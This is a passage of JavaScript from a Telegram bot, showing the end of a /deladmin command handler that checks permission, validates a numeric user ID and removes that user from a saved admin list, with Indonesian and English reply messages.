            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});